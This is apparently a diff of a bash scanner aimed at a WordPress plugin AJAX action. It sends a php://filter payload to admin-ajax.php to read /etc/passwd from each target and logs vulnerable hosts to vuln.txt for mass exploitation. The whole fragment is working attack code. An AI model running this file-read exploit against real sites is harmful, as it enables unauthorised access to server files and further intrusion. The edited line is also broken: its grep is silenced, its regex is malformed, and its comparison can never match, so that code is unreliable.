@@ -24,7 +24,7 @@ green='\e[42m'
 target=$1
 thread=$2
 
-if [[ $(curl -s -d 'action=extensive_vc_init_shortcode_pagination&options[template]=php://filter/convert.base64-encode/resource=/etc/passwd' --connect-timeout 10 --max-time 10 --insecure $target'/wp-admin/admin-ajax.php') =~ 'cm9vdD' ]]; 
+if [[ $(curl -s -d 'action=extensive_vc_init_shortcode_pagination&options[template]=php://filter/convert.base64-encode/resource=/etc/passwd' --connect-timeout 10 --max-time 10 --insecure $target'/wp-admin/admin-ajax.php' | grep -q -oE '[A-Za-z0-9+/]+={0,2]') =~ 'Base64 found' ]]; 
 then
     printf "${green}[ Vuln ]${classic} => [$target] \n";
     echo "$target" >> vuln.txt
